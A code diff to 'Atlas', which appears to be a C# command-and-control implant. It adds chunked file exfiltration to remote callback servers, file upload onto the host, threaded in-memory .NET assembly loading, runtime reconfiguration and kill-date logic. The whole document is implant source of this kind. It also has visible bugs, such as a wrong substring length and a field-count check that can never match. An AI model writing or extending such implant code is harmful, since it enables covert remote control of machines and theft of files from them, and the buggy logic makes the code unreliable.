@@ -14,7 +14,7 @@ namespace Atlas
         {
             if (!CheckDate())
             {
-                System.Environment.Exit(1);
+                Environment.Exit(1);
             }
             Http.GetTasking(JobList);
             Dispatch(JobList);
@@ -27,12 +27,59 @@ namespace Atlas
             {
                 foreach (Job Job in JobList.jobs)
                 {
-                    if (!Job.job_started == true)
+                    if (!Job.job_started)
                     {
                         if (Job.command == "loadassembly")
                         {
-                            Job.job_started = true;
-                            ExecuteTasking(Job);
+                            if (Job.chunk_num == Job.total_chunks)
+                            {
+                                Thread thread = new Thread(() => ExecuteTasking(Job));
+                                thread.Start();
+                                Job.job_started = true;
+                                Job.thread = thread;
+                            }
+                        }
+                        else if (Job.command == "upload")
+                        {
+                            if (Job.chunks.Count == 0)
+                            {
+                                break;
+                            }
+                            else
+                            {
+                                Thread thread = new Thread(() => ExecuteTasking(Job));
+                                thread.Start();
+                                Job.thread = thread;
+                            }
+                        }
+                        else if (Job.download)
+                        {
+                            if (Job.file_id == null)
+                            {
+                                if (!System.IO.File.Exists(Job.parameters))
+                                {
+                                    Job.response = "Error file does not exists";
+                                    Job.completed = true;
+                                    Job.success = false;
+                                    Job.total_chunks = 0;
+                                }
+                                else
+                                {
+                                    Job.path = Modules.Download.GetPath(Job.parameters);
+                                    Job.total_chunks = (int)Modules.Download.GetTotalChunks(Job.parameters);
+                                    Job.file_size = Modules.Download.GetFileSize(Job.parameters);
+                                    Job.completed = true;
+                                    Job.success = true;
+                                }
+                            }
+                            else if (Job.chunks.Count > 1)
+                            {
+                                break;
+                            }
+                            else
+                            {
+                                ExecuteTasking(Job);
+                            }
                         }
                         else
                         {
@@ -58,9 +105,8 @@ namespace Atlas
                 switch (Job.command.ToLower())
                 {
                     case "loadassembly":
-                        UploadTasking UploadTasking = UploadTasking.FromJson(Job.parameters);
-                        byte[] Assembly = Modules.GetAssembly(UploadTasking.assembly_id);
-                        if (Modules.Load(UploadTasking.assembly_id, Convert.ToBase64String(Assembly)))
+                        byte[] assembly = Modules.GetAssembly(Job.chunks, Job.total_chunks);
+                        if (Modules.Load(Job.file_id, Convert.ToBase64String(assembly)))
                         {
                             Job.completed = true;
                             Job.response = "assembly successfully loaded";
@@ -92,7 +138,29 @@ namespace Atlas
                             args = new string[] { runAssembly.args };
                         }
                         string response = Modules.Invoke(runAssembly.assembly_id, args);
-                        Job.response = response;
+                        if (response.Length < Config.ChunkSize)
+                        {
+                            Job.response = response;
+                        }
+                        else
+                        {
+                            Job.total_chunks = (response.Length + Config.ChunkSize - 1) / Config.ChunkSize;
+                            int count = 0;
+                            while (count != Job.total_chunks)
+                            {
+                                if (count + 1 == Job.total_chunks)
+                                {
+                                    int size = response.Length - (count * Config.ChunkSize);
+                                    Job.chunks.Add(response.Substring((count * Config.ChunkSize), count));
+                                    count++;
+                                }
+                                else
+                                {
+                                    Job.chunks.Add(response.Substring((count * Config.ChunkSize), Config.ChunkSize));
+                                    count++;
+                                }
+                            }
+                        }
                         Job.completed = true;
                         if (Job.response != "\r\n")
                         {
@@ -116,8 +184,70 @@ namespace Atlas
                         Job.completed = true;
                         Job.success = true;
                         break;
+                    case "download":
+                        if (Job.chunk_num != Job.total_chunks)
+                        {
+                            string chunk = Modules.Download.GetChunk(Job.parameters, Job.chunk_num, Job.total_chunks, Job.file_size);
+                            Job.chunks.Add(chunk);
+                            Job.chunk_num++;
+                        }
+                        break;
+                    case "upload":
+                        if (Job.write_num == 0)
+                        {
+                            if (System.IO.File.Exists(Job.path))
+                            {
+                                Job.response = "Error file already exists";
+                                Job.completed = true;
+                                Job.success = false;
+                            }
+                        }
+                        if (Job.chunks.Count != 0)
+                        {
+                            if(Modules.Upload(Job.path, Job.chunks[0]))
+                            {
+                                Job.write_num++;
+                                Job.chunks.Remove(Job.chunks[0]);
+                            }
+                        }
+                        if (Job.write_num == Job.total_chunks)
+                        {
+                            Job.response = "File successfully uploaded";
+                            Job.completed = true;
+                            Job.success = true;
+                        }
+                        break;
+                    case "config":
+                        if (Job.parameters.ToLower() == "info")
+                        {
+                            Job.response = Modules.GetConfig();
+                            Job.completed = true;
+                            Job.success = true;
+                        }
+                        else if(Modules.SetConfig(Job.parameters.ToLower()))
+                        {
+                            Job.response = "Configuration successfully updated";
+                            Job.completed = true;
+                            Job.success = true;
+                        }
+                        else
+                        {
+                            Job.response = "Error could not update config";
+                            Job.completed = true;
+                            Job.success = false;
+                        }
+                        break;
                     case "exit":
                         Environment.Exit(1);
+                        break;
+                    case "jobs":
+                        break;
+                    case "jobkill":
+                        break;
+                    default:
+                        Job.response = "Command not implemented";
+                        Job.success = false;
+                        Job.completed = true;
                         break;
                 }
             }
@@ -131,7 +261,7 @@ namespace Atlas
         {
             try
             {
-                if (Job.command == "loadassembly")
+                if (Job.command == "download")
                 {
                     JobList.jobs.Remove(Job);
                 }
@@ -150,15 +280,16 @@ namespace Atlas
 
         public static bool CheckDate()
         {
-            string date = System.DateTime.Now.ToString("yyyy-MM-dd");
-            if (date == Config.KillDate)
+            DateTime kill = DateTime.Parse(Config.KillDate);
+            DateTime date = DateTime.Today;
+            if (DateTime.Compare(kill, date) >= 0)
             {
-                return false;
+                return true;
             }
 
             else
             {
-                return true;
+                return false;
             }
         }
 
@@ -270,6 +401,25 @@ namespace Atlas
             return sb.ToString();
         }
 
+        public static void GetServers()
+        {
+            foreach (string domain in Config.CallbackHosts)
+            {
+                Server server = new Server
+                {
+                    domain = domain,
+                    count = 0
+                };
+                Config.Servers.Add(server);
+            }
+        }
+
+        public class Server
+        {
+            public string domain { get; set; }
+            public int count { get; set; }
+        }
+
         public class CheckIn
         {
             public string action { get; set; }
@@ -357,7 +507,12 @@ namespace Atlas
         public class GetTaskingResponse
         {
             public string action { get; set; }
-            public List<Task> tasks { get; set; } = new List<Task>();
+            public List<Task> tasks { get; set; }
+
+            public GetTaskingResponse()
+            {
+                tasks = new List<Task>();
+            }
 
             public static string GetTaskingResponseFormat = @"{{""action"": ""{0}"", ""tasks"": {1}}}";
 
@@ -388,7 +543,12 @@ namespace Atlas
         public class PostResponse
         {
             public string action { get; set; }
-            public List<TaskResponse> responses { get; set; } = new List<TaskResponse>();
+            public List<TaskResponse> responses { get; set; }
+
+            public PostResponse()
+            {
+                responses = new List<TaskResponse>();
+            }
 
             public string JsonFormat = @"{{""action"":""{0}"",""responses"":[{1}]}}";
 
@@ -415,7 +575,12 @@ namespace Atlas
         public class PostResponseResponse
         {
             public string action { get; set; }
-            public List<Response> responses { get; set; } = new List<Response>();
+            public List<Response> responses { get; set; }
+
+            public PostResponseResponse()
+            {
+                responses = new List<Response>();
+            }
 
             public static string PostResponseResponseFormat = @"{{""action"": ""{0}"", ""responses"": {1}}}";
 
@@ -524,14 +689,27 @@ namespace Atlas
             public string status { get; set; }
             public string completed { get; set; }
             public string error { get; set; }
+            public int? total_chunks { get; set; }
+            public string full_path { get; set; }
+            public int? chunk_num { get; set; }
+            public string chunk_data { get; set; }
+            public string file_id { get; set; }
 
-            public string JsonFormat = @"{{""task_id"":""{0}"",""user_output"":""{1}"",""status"":""{2}"",""completed"":{3},""error"":""{4}""}}";
+            public string JsonFormat = @"{{""task_id"":""{0}"",""user_output"":""{1}"",""status"":""{2}"",""completed"":{3},""error"":""{4}"",""total_chunks"":{5},""full_path"":""{6}"",""chunk_num"":{7},""chunk_data"":""{8}"",""file_id"":""{9}""}}";
+            public string JsonFormat1 = @"{{""task_id"":""{0}"",""user_output"":""{1}"",""status"":""{2}"",""completed"":""{3}"",""error"":""{4}"",""total_chunks"":""{5}"",""full_path"":""{6}"",""chunk_num"":{7},""chunk_data"":""{8}"",""file_id"":""{9}""}}";
+            public string JsonFormat2 = @"{{""task_id"":""{0}"",""user_output"":""{1}"",""status"":""{2}"",""completed"":""{3}"",""error"":""{4}"",""total_chunks"":{5},""full_path"":""{6}"",""chunk_num"":""{7}"",""chunk_data"":""{8}"",""file_id"":""{9}""}}";
+            public string JsonFormat3 = @"{{""task_id"":""{0}"",""user_output"":""{1}"",""status"":""{2}"",""completed"":""{3}"",""error"":""{4}"",""total_chunks"":""{5}"",""full_path"":""{6}"",""chunk_num"":""{7}"",""chunk_data"":""{8}"",""file_id"":""{9}""}}";
 
             public static string ToJson(TaskResponse task_response)
             {
+                string Format = task_response.JsonFormat;
                 if (task_response.user_output == null)
                 {
                     task_response.user_output = "";
+                }
+                if (task_response.completed == null)
+                {
+                    task_response.completed = "";
                 }
                 if (task_response.error == null)
                 {
@@ -541,13 +719,58 @@ namespace Atlas
                 {
                     task_response.status = "";
                 }
+                string total_chunks;
+                if (task_response.total_chunks == null)
+                {
+                    Format = task_response.JsonFormat1;
+                    total_chunks = "";
+                }
+                else
+                {
+                    Format = task_response.JsonFormat2;
+                    total_chunks = task_response.total_chunks.ToString();
+                }
+                if (task_response.full_path == null)
+                {
+                    task_response.full_path = "";
+                }
+                string chunk_num;
+                if (task_response.chunk_num == null)
+                {
+                    if (Format != task_response.JsonFormat2)
+                    {
+                        Format = task_response.JsonFormat3;
+                    }
+                    chunk_num = "";
+                }
+                else
+                {
+                    if (Format != task_response.JsonFormat2)
+                    {
+                        Format = task_response.JsonFormat1;
+                    }
+                    chunk_num = task_response.chunk_num.ToString();
+                }
+                if (task_response.chunk_data == null)
+                {
+                    task_response.chunk_data = "";
+                }
+                if (task_response.file_id == null)
+                {
+                    task_response.file_id = "";
+                }
                 return String.Format(
-                    task_response.JsonFormat,
+                    Format,
                     JavaScriptStringEncode(task_response.task_id),
                     JavaScriptStringEncode(task_response.user_output),
                     JavaScriptStringEncode(task_response.status),
                     JavaScriptStringEncode(task_response.completed),
-                    JavaScriptStringEncode(task_response.error)
+                    JavaScriptStringEncode(task_response.error),
+                    JavaScriptStringEncode(total_chunks),
+                    JavaScriptStringEncode(task_response.full_path),
+                    JavaScriptStringEncode(chunk_num),
+                    JavaScriptStringEncode(task_response.chunk_data),
+                    JavaScriptStringEncode(task_response.file_id)
                 );
             }
         }
@@ -557,9 +780,11 @@ namespace Atlas
             public string task_id { get; set; }
             public string status { get; set; }
             public string error { get; set; }
+            public string file_id { get; set;}
 
             public static string ResponseSuccessFormat = @"{{""status"": ""{0}"", ""task_id"": ""{1}""}}";
             public static string ResponseErrorFormat = @"{{""status"": ""{0}"", ""task_id"": ""{1}"", ""error"": ""{2}""}}";
+            public static string ResponseDownloadFormat = @"{{""status"": ""{0}"", ""task_id"": ""{1}"", ""file_id"": ""{2}""}}";
 
             public static List<string> ParseSuccess(string data, string format)
             {
@@ -599,37 +824,46 @@ namespace Atlas
                 }
                 List<Response> responses = new List<Response>();
                 string[] responses_split = responses_json.Split(new[] { "}," }, StringSplitOptions.RemoveEmptyEntries);
-                int count = 1;
                 foreach (string response in responses_split)
                 {
                     List<string> parseList = new List<string> { };
-                    if (count != responses_split.Length)
+                    if (response.Contains("error"))
                     {
-                        parseList = Response.ParseSuccess(response + "}", ResponseSuccessFormat.Replace("{{", "{").Replace("}}", "}"));
-                        parseList.Add("");
-                        if (parseList[0] == "")
+                        parseList = Response.ParseError(response, ResponseErrorFormat.Replace("{{", "{").Replace("}}", "}"));
+                        if (parseList.Count != 3) { return null; }
+                        Response new_response = new Response
                         {
-                            parseList = Response.ParseError(response, ResponseErrorFormat.Replace("{{", "{").Replace("}}", "}"));
-                        }
+                            status = parseList[0],
+                            task_id = parseList[1],
+                            error = parseList[2]
+                        };
+                        responses.Add(new_response);
+                    }
+                    else if (response.Contains("file_id"))
+                    {
+                        parseList = Response.ParseError(response, ResponseDownloadFormat.Replace("{{", "{").Replace("}}", "}"));
+                        if (parseList.Count != 3) { return null; }
+                        Response new_response = new Response
+                        {
+                            status = parseList[0],
+                            task_id = parseList[1],
+                            file_id = parseList[2]
+                        };
+                        responses.Add(new_response);
                     }
                     else
                     {
                         parseList = Response.ParseSuccess(response + "}", ResponseSuccessFormat.Replace("{{", "{").Replace("}}", "}"));
                         parseList.Add("");
-                        if (parseList[0] == "")
+                        if (parseList.Count != 3) { return null; }
+                        Response new_response = new Response
                         {
-                            parseList = Response.ParseError(response, ResponseErrorFormat.Replace("{{", "{").Replace("}}", "}"));
-                        }
+                            status = parseList[0],
+                            task_id = parseList[1],
+                            error = parseList[2]
+                        };
+                        responses.Add(new_response);
                     }
-                    if (parseList.Count != 3) { return null; }
-                    Response new_response = new Response
-                    {
-                        status = parseList[0],
-                        task_id = parseList[1],
-                        error = parseList[2]
-                    };
-                    responses.Add(new_response);
-                    ++count;
                 }
                 return responses;
             }
@@ -638,7 +872,12 @@ namespace Atlas
         public class JobList
         {
             public int job_count { get; set; }
-            public List<Job> jobs { get; set; } = new List<Job>();
+            public List<Job> jobs { get; set; }
+
+            public JobList()
+            {
+                jobs = new List<Job>();
+            }
         }
 
         public class Job
@@ -651,32 +890,51 @@ namespace Atlas
             public string command { get; set; }
             public string parameters { get; set; }
             public string response { get; set; }
-            internal Thread thread { get; set; }
+            public Thread thread { get; set; }
+            public bool upload { get; set; }
+            public bool download { get; set; }
+            public bool chunking_started { get; set; }
+            public int total_chunks { get; set; }
+            public int chunk_num { get; set; }
+            public int write_num { get; set; }
+            public string file_id { get; set; }
+            public long file_size { get; set; }
+            public string path { get; set; }
+            public List<string> chunks { get; set; }
+
+            public Job()
+            {
+                chunks = new List<string>();
+            }
         }
 
         public class UploadTasking
         {
             public string assembly_id { get; set; }
+            public string remote_path { get; set; }
 
-            public static string UploadTaskingFormat = @"""assembly_id"": ""{0}""";
+            public static string UploadTaskingFormat = @"""assembly_id"": ""{0}"", ""remote_path"": ""{1}""";
 
             public static List<string> Parse(string data, string format)
             {
                 format = Regex.Escape(format).Replace("\\", @"");
                 if (format.Contains("{0}")) { format = format.Replace("{0}", "(?'group0'.*)"); }
+                if (format.Contains("{1}")) { format = format.Replace("{1}", "(?'group1'.*)"); }
                 Match match = new Regex(format).Match(data.Replace(@"\", @""));
                 List<string> matches = new List<string>();
                 if (match.Groups["group0"] != null) { matches.Add(match.Groups["group0"].Value); }
+                if (match.Groups["group1"] != null) { matches.Add(match.Groups["group1"].Value); }
                 return matches;
             }
 
             public static UploadTasking FromJson(string message)
             {
                 List<string> parseList = UploadTasking.Parse(message, UploadTaskingFormat);
-                if (parseList.Count != 1) { return null; }
+                if (parseList.Count != 2) { return null; }
                 return new UploadTasking
                 {
-                    assembly_id = parseList[0]
+                    assembly_id = parseList[0],
+                    remote_path = parseList[1]
                 };
             }
         }
@@ -718,8 +976,10 @@ namespace Atlas
             public int chunk_size { get; set; }
             public string file_id { get; set; }
             public int chunk_num { get; set; }
+            public string full_path { get; set; }
+            public string task_id { get; set; }
 
-            public string JsonFormat = @"{{""action"":""{0}"",""chunk_size"":{1},""file_id"":""{2}"",""chunk_num"":{3}}}";
+            public string JsonFormat = @"{{""action"":""{0}"",""chunk_size"":{1},""file_id"":""{2}"",""chunk_num"":{3}, ""full_path"": ""{4}"",""task_id"":""{5}""}}";
 
             public static string ToJson(Upload upload)
             {
@@ -728,11 +988,13 @@ namespace Atlas
                     JavaScriptStringEncode(upload.action),
                     JavaScriptStringEncode(upload.chunk_size.ToString()),
                     JavaScriptStringEncode(upload.file_id),
-                    JavaScriptStringEncode(upload.chunk_num.ToString())
+                    JavaScriptStringEncode(upload.chunk_num.ToString()),
+                    JavaScriptStringEncode(upload.full_path),
+                    JavaScriptStringEncode(upload.task_id)
                 );
             }
         }
-
+        
         public class UploadResponse
         {
             public string action { get; set; }
@@ -740,8 +1002,9 @@ namespace Atlas
             public int chunk_num { get; set; }
             public string chunk_data { get; set; }
             public string file_id { get; set; }
+            public string task_id { get; set; }
 
-            public static string UploadResponseFormat = @"{{""action"": ""{0}"", ""total_chunks"": {1}, ""chunk_num"": {2}, ""chunk_data"": ""{3}"", ""file_id"": ""{4}""}}";
+            public static string UploadResponseFormat = @"{{""action"": ""{0}"", ""total_chunks"": {1}, ""chunk_num"": {2}, ""chunk_data"": ""{3}"", ""file_id"": ""{4}"", ""task_id"": ""{5}""}}";
 
             public static List<string> Parse(string data, string format)
             {
@@ -751,6 +1014,7 @@ namespace Atlas
                 if (format.Contains("{2}")) { format = format.Replace("{2}", "(?'group2'.*)"); }
                 if (format.Contains("{3}")) { format = format.Replace("{3}", "(?'group3'.*)"); }
                 if (format.Contains("{4}")) { format = format.Replace("{4}", "(?'group4'.*)"); }
+                if (format.Contains("{5}")) { format = format.Replace("{5}", "(?'group5'.*)"); }
                 Match match = new Regex(format).Match(data.Replace(@"\", @""));
                 List<string> matches = new List<string>();
                 if (match.Groups["group0"] != null) { matches.Add(match.Groups["group0"].Value); }
@@ -758,20 +1022,57 @@ namespace Atlas
                 if (match.Groups["group2"] != null) { matches.Add(match.Groups["group2"].Value); }
                 if (match.Groups["group3"] != null) { matches.Add(match.Groups["group3"].Value); }
                 if (match.Groups["group4"] != null) { matches.Add(match.Groups["group4"].Value); }
+                if (match.Groups["group5"] != null) { matches.Add(match.Groups["group5"].Value); }
                 return matches;
             }
 
             public static UploadResponse FromJson(string message)
             {
                 List<string> parseList = UploadResponse.Parse(message, UploadResponseFormat.Replace("{{", "{").Replace("}}", "}"));
-                if (parseList.Count != 5) { return null; }
+                if (parseList.Count != 6) { return null; }
                 return new UploadResponse
                 {
                     action = parseList[0],
                     total_chunks = Int32.Parse(parseList[1]),
                     chunk_num = Int32.Parse(parseList[2]),
                     chunk_data = parseList[3],
-                    file_id = parseList[4]
+                    file_id = parseList[4],
+                    task_id = parseList[5]
+                };
+            }
+        }
+
+        public class DownloadResponse
+        {
+            public string status { get; set; }
+            public string file_id { get; set; }
+            public string task_id { get; set; }
+
+            public static string DownloadResponseFormat = @"{{""status"": ""{0}"", ""file_id"": ""{1}"", ""task_id"": ""{2}""}}";
+
+            public static List<string> Parse(string data, string format)
+            {
+                format = Regex.Escape(format).Replace("\\{", @"{");
+                if (format.Contains("{0}")) { format = format.Replace("{0}", "(?'group0'.*)"); }
+                if (format.Contains("{1}")) { format = format.Replace("{1}", "(?'group1'.*)"); }
+                if (format.Contains("{2}")) { format = format.Replace("{2}", "(?'group2'.*)"); }
+                Match match = new Regex(format).Match(data.Replace(@"\", @""));
+                List<string> matches = new List<string>();
+                if (match.Groups["group0"] != null) { matches.Add(match.Groups["group0"].Value); }
+                if (match.Groups["group1"] != null) { matches.Add(match.Groups["group1"].Value); }
+                if (match.Groups["group2"] != null) { matches.Add(match.Groups["group2"].Value); }
+                return matches;
+            }
+
+            public static DownloadResponse FromJson(string message)
+            {
+                List<string> parseList = DownloadResponse.Parse(message, DownloadResponseFormat.Replace("{{", "{").Replace("}}", "}"));
+                if (parseList.Count != 5) { return null; }
+                return new DownloadResponse
+                {
+                    status = parseList[0],
+                    file_id = parseList[1],
+                    task_id = parseList[2]
                 };
             }
         }
